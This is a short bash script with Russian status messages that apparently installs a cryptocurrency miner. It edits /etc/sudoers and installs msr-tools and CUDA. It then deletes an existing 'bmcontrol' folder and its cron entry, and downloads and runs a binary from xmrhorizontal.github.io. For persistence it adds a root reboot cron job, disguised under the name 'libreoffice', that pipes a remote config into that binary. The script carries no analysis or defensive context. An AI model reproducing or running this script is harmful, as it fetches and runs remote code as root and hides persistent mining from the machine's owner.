#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."
apt-get update
apt-get install -y hwloc msr-tools
if ( lspci | grep -i nvidia ); then
	apt-get install -y nvidia-cuda-toolkit
fi
if [ -d "/root/bmcontrol" ]; then
    echo "Пишу в папку /root/bmcontrol."
    cd /root/bmcontrol
    ./stop.sh
    rm -rf ./*
    rm /etc/cron.d/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
    ./cpuhp --config=/root/bmcontrol/config.json
elif [ -d "/home/user/bmcontrol" ]; then
    echo "Пишу в папку /home/user/bmcontrol."
    cd /home/user/bmcontrol
    ./stop.sh
    rm -rf ./*
    rm /etc/cron.d/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
    ./cpuhp --config=/root/bmcontrol/config.json
else
    echo "Создаю папку /root/bmcontrol."
    mkdir /root/bmcontrol
    cd /root/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
fi
echo OK!

